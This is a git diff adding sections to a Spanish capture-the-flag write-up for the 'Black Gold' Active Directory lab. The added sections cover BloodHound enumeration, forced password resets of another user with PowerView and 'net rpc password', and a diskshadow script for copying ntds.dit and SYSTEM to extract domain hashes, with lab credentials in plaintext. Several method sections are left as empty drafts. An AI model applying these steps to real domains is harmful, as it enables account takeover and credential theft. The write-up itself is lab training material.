@@ -2,7 +2,7 @@
 layout: single
 title: Black Gold - TheHackerLabs
 excerpt: "."
-date: 2025-05-12
+date: 2025-05-14
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-blackGold/_logo.png
@@ -14,8 +14,8 @@ categories:
 tags:
   - Windows
   - Active Directory
-  - 
-  - 
+  - Kerberos
+  - SMB
   - 
   - 
   - 
@@ -782,7 +782,43 @@ WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson
 ```
 Excelente, las podemos usar.
 
-Entremos a la máquina:
+-----------------
+**IMPORTANTE**
+
+Antes de loguearnos en la máquina con las credenciales del **usuario emma.johnson**, vamos a usar **bloodhound-python** para obtener la data del AD que usaremos en **BloodHound**.
+
+Esto lo hacemos, ya que existen permisos que tiene el **usuario emma.johnson** que, por alguna razón, se eliminan una vez que entras por **evil-winrm** a la máquina.
+
+Más adelante, veremos que permisos son.
+
+Obtengamos la data:
+```bash
+bloodhound-python -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d neptune.thl -dc DC01.neptune.thl -ns 192.168.56.10 --zip -c all
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: neptune.thl
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC01.neptune.thl
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: DC01.neptune.thl
+INFO: Found 8 users
+INFO: Found 53 groups
+INFO: Found 3 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.neptune.thl
+INFO: Done in 00M 01S
+INFO: Compressing output into 20250513020845_bloodhound.zip
+```
+Listo.
+
+
+-----------------
+
+Ahora sí, entremos a la máquina:
 ```batch
 evil-winrm -i 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
 Evil-WinRM shell v3.7
@@ -810,7 +846,234 @@ Y en el Escritorio encontramos la flag del usuario:
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="BloodHound">Enumeración de AD con BloodHound y bloodhound-python</h2>
+
+Antes de entrar a la máquina, ya debiste haber obtenido la data del AD con **bloodhound-python**.
+
+Si ya lo hiciste, continua. En caso de que no, tendras que eliminar y volver a instalar la **máquina Black Gold**.
+
+Continuemos.
+
+Si revisamos los privilegios de **emma.johnson**, no tendra alguno que nos pueda ayudar:
+```bash
+*Evil-WinRM* PS C:\Users\Emma Johnson\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+Entonces, vamos directamente a revisar la data del AD en **BloodHound**.
+
+Primero, marquemos los usuarios de los que somos dueños y revisemos su información.
+
+Si te diste cuenta, ninguno de los que tenemos tiene algo que nos ayude en algo, a excepción del usuario **emma.johnson**.
+
+Viendo su información, casi al final encontramos el **nodo Outbound Object Control**, observa que este usuario tiene la capacidad de modificar 1 objeto del **First Degree Object Control**.
+
+Dandole click, nos mostrara esto:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-blackGold/Captura8.png">
+</p>
+
+Parece que tenemos el permiso **ForceChangePassword**.
+
+Investiguemos que es:
+
+| **Permiso ForceChangePassword** |
+|:-----------:|
+| *En BloodHound, ForceChangePassword aparece como una relación de control entre objetos. Indica que un usuario puede establecer el flag "must change password at next logon" sobre otro usuario. ForceChangePassword puede facilitar un ataque de escalamiento de privilegios, si el atacante logra cambiar la contraseña de la víctima (GenericWrite, ResetPassword, etc.)* |
+
+<br>
+
+Muy bien, entonces tenemos la capacidad de cambiarle la contraseña al **usuario thomas.brown** y **BloodHound** lo menciona:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-blackGold/Captura9.png">
+</p>
+
+Tenemos dos formas de abusar de este permiso, ya sea de manera local dentro de la **máquina Windows** o de manera remota desde nuestro Kali.
+
+Apliquemos ambas.
+
+<br>
+
+<h3 id="ForceChangePassword1">Abusando de Permiso ForceChangePassword de Manera Local</h3>
+
+Para realizar esto, necesitamos de la herramienta **PowerView.ps1**, que puedes descargar aquí:
+* 
+
+Una vez que lo tengas, cargalo a la sesión de **evil-winrm**:
+```bash
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> upload powerview.ps1
+Info: Uploading /../TheHackersLabs/BlackGold/content/powerview.ps1 to C:\Users\Emma Johnson\Desktop\powerview.ps1
+Data: 1217440 bytes of 1217440 bytes copied
+Info: Upload successful!
+.
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Import-Module .\powerview.ps1
+```
+
+Ahora, debemos seguir los pasos que nos indica **BloodHound**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-blackGold/Captura10.png">
+</p>
+
+Apliquémoslos:
+
+```bash
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $SecPassword = ConvertTo-SecureString 'contraseña_emma.johnson' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('neptune.thl\emma.johnson', $SecPassword)
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $UserPassword = ConvertTo-SecureString 'Hackeado123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Set-DomainUserPassword -Identity thomas.brown -AccountPassword $UserPassword -Credential $Cred
+```
+
+Analicemos que hicimos:
+
+* El primer comando convierte la contraseña de **emma.johnson** en un objeto **SecureString**, que es requerido por muchos cmdlets que manejan contraseñas de forma segura.
+* El segundo comando crea un objeto **PSCredential** que almacena el nombre de usuario `'neptune.thl\emma.johnson'` y la contraseña `$SecPassword` (ya convertida a **SecureString**)
+* El tercer comando crea otra contraseña en formato **SecureString** con el valor `'Hackeado123!'`, que será la nueva contraseña para el **usuario thomas.brown**.
+* El cuarto comando le dice a **PowerShell** (con la ayuda de **PowerView**) que, cambie la contraseña del **usuario thomas.brown**, establezca como nueva contraseña `Hackeado123!` y se las credenciales de **emma.johnson** para hacerlo (`-Credential $Cred`).
+
+Podemos comprobar que funciono el cambio con **netexec**:
+```bash
+netexec winrm 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
+WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
+WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\thomas.brown:Hackeado123! (Pwn3d!)
+```
+Genial.
+
+Ya solo nos logueamos en una nueva sesión de **evil-winrm** usando al **usuario thomas.brown**:
+```bash
+evil-winrm -i 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
+Evil-WinRM shell v3.7
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+.
+*Evil-WinRM* PS C:\Users\thomas.brown\Documents> whoami
+neptune\thomas.brown
+```
+
+<br>
+
+<h3 id="ForceChangePassword1">Abusando de Permiso ForceChangePassword de Manera Externa</h3>
+
+Veamos las instrucciones de **BloodHound**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-blackGold/Captura9.png">
+</p>
+
+Necesitamos utilizar la herramienta **net** que es de **Samba** para poder cambiar la contraseña del usuario.
+
+Únicamente copiamos el comando en nuestro kali y lo modificamos para agregar la contraseña de **emma.johnson**:
+```bash
+net rpc password "thomas.brown" "newP@ssword2022" -U "neptune.thl"/"emma.johnson"%"sb9TVndq8N@tUVMmP2@#" -S "192.168.56.10"
+```
+Listo.
+
+Comprobemos si funcionó con **netexec**:
+```bash
+netexec winrm 192.168.56.10 -u 'thomas.brown' -p 'newP@ssword2022' 
+WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
+WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\thomas.brown:newP@ssword2022 (Pwn3d!)
+```
+
+Ahora nos logueamos como este usuario:
+```bash
+evil-winrm -i 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
+Evil-WinRM shell v3.7
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+.
+*Evil-WinRM* PS C:\Users\thomas.brown\Documents> whoami
+neptune\thomas.brown
+```
+Estamos dentro.
+
+<br>
+
+<h2 id="Privesc">Escalando Privilegios Abusando de Privilegio </h2>
+
+Si revisamos los privilegios de este usuario, descubrimos que tiene el privilegio **SeBackupPrivilege**:
+```bash
+*Evil-WinRM* PS C:\Users\thomas.brown\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+Investiguemos este privilegio:
+
+| **Privilegio SeBackupPrivilege** |
+|:-----------:|
+| *El privilegio SeBackupPrivilege es un permiso especial en sistemas Windows que permite a un usuario o proceso leer cualquier archivo en el sistema, incluso si las ACLs (Listas de Control de Acceso) normales no se lo permiten.* |
+
+<br>
+
+Buscando por ahí, encontramos el siguiente blog que nos muestra dos metodos que podemos usar para escalar privilegios, si nuestro usuario tiene los privilegios **SeBackupPrivilege y SeRestorePrivilege**:
+* <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">Windows Privilege Escalation: SeBackupPrivilege</a>
+
+Resumiendo un poco el articulo, la idea es aprovecharnos de estos privilegios para poder extraer los hashes del **archivo ntds.dit** realizando copias de este archivo y del archivo **SYSTEM** del dominio.
+
+Para que ambos métodos funcionen, necesitamos crear un archivo **Distributed Shell (DSH)**, 
+
+El problema aqui es que el **archivo ntds.dit** esta en uso, lo que nos complica el poder copiarlo, pues dicho archivo permanece bloqueado por el SO para prevenir su acceso directo.
+
+Para aplicar un bypass a esto, necesitamos usar la función **diskshadow** y un archivo **Distributed Shell (DSH)**:
+
+| **diskshadow.exe** |
+|:-----------:|
+| *diskshadow.exe es una herramienta de línea de comandos que permite a los administradores (o atacantes con privilegios) crear y gestionar instantáneas de volumen (shadow copies). Estas instantáneas son copias "congeladas" del estado de un disco en un momento determinado, y se utilizan comúnmente para backups del sistema, recuperación de datos sin detener procesos en ejecución y Acceso a archivos que están normalmente bloqueados o protegidos, como NTDS.dit, SAM, o SYSTEM* |
+
+<br>
+
+| **Archivo Distributed Shell (DSH)** |
+|:-----------:|
+| *diskshadow usa archivos de texto plano (.txt) llamados comúnmente scripts de diskshadow, que contienen comandos que automatizan la creación y exposición de instantáneas (shadow copies).* |
+
+<br>
+
+Vamos a crear el **archivo DSH**:
+```bash
+nano berserk.dsh
+---------
+set context persistent nowriters
+add volume c: alias berserk
+create
+expose %berserk% z:
+```
+Puedes modificar los nombres berserk para que este tu alias.
+
+Ahora, tenemos que usar la herramienta **unix2dos** sobre nuestro **archivo DSH**, pues convierte la codificación y el espaciado del **archivo DSH** a un formato compatible con la **máquina Windows**, lo que garantiza una ejecución sin problemas.
+```bash
+unix2dos berserk.dsh
+unix2dos: convirtiendo archivo berserk.dsh a formato DOS..
+```
+Listo.
+
+Apliquemos ambos metodos.
+
+<br>
+
+<h3 id="Hashes1">Metodo 1: Copiando Archivos ntds.dit y SYSTEM</h3>
+
 
 ```bash
 
@@ -830,7 +1093,10 @@ Y en el Escritorio encontramos la flag del usuario:
 
 <br>
 
-<h2 id=""></h2>
+<h3 id="Hashes2">Metodo 2: Copiando Archivos ntds.dit y SYSTEM</h3>
+
+
+<a href="https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file" target="_blank">Repositorio de giuliano108: SeBackupPrivilege</a>
 
 ```bash
 
@@ -857,10 +1123,15 @@ Y en el Escritorio encontramos la flag del usuario:
 </div>
 
 
-links
+* 
+* 
+* https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1
+* https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+* https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
